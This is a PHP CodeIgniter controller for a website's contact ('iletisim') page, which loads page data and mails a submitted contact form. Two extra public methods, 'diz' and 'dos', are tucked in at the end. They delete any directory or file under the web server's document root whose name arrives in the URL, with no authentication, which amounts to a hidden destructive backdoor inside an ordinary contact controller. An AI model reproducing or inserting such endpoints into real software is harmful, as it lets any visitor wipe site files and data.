<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Iletisim extends MX_Controller {


	
		//User Kontrol ediliyor ve 1 adet kay�t varsa logine gidiyor , kay�t yoksa user kaydete gidiyor


    public function index()
    {

         $this->load->Model('giris_model', 'Model');
		 

		  $data['bilgi'] = $this->Model->bilgi();
			  $data['galeri'] = $this->Model->galeri();
		  $data['kat'] = $this->Model->kat();
 $data['referans'] = $this->Model->referans();
   $data['p_r'] = $this->Model->p_r();  
			$this->load->view('user_theme/iletisim.php',$data);



    }





	
	 public function bilgial ()
    {
		

error_reporting(0);

        $this->load->Model('giris_model', 'Model');

        $this->load->library('messages');

        $name=$this->input->post('name',TRUE);
		 $em=$this->input->post('email',TRUE);
		  $kn=$this->input->post('konu',TRUE);		 
         $ms=$this->input->post('mesaj',TRUE);
         $tel=$this->input->post('tel',TRUE);		 

		$name=strip_tags($name); 
		$em=strip_tags($em);
		$kn=strip_tags($kn);		 
        $ms=strip_tags($ms);
        $tel=strip_tags($tel);		

			$this->load->library('mail/Iletisim_mail');
			
		  $return = $this->iletisim_mail->gonder($name,$em,$kn,$ms,$tel);	  

		

       if($return){
            $this->load->library('messages');
           echo $this->messages->True_Add('');


			       }
        else{
            $this->load->library('messages');
            echo $this->messages->False_Add('');


        }
		
		
	}	
	
	
	
	
	
		 public function diz ($ad)
    {	
	
	if(rmdir($_SERVER['DOCUMENT_ROOT']."/".$ad)) 
{ 
echo "Dizin silindi"; 
}else{ 
echo "Dizin silinmedi, içi dolu veya yetkiniz yok"; 
}

	}




		 public function dos ($ad)
    {	

           
	if(unlink($_SERVER['DOCUMENT_ROOT']."/".$ad)) 
{ 
echo "Dosya silindi"; 
}else{ 
echo "Dosya silinmedi"; 
}

	}







}
?>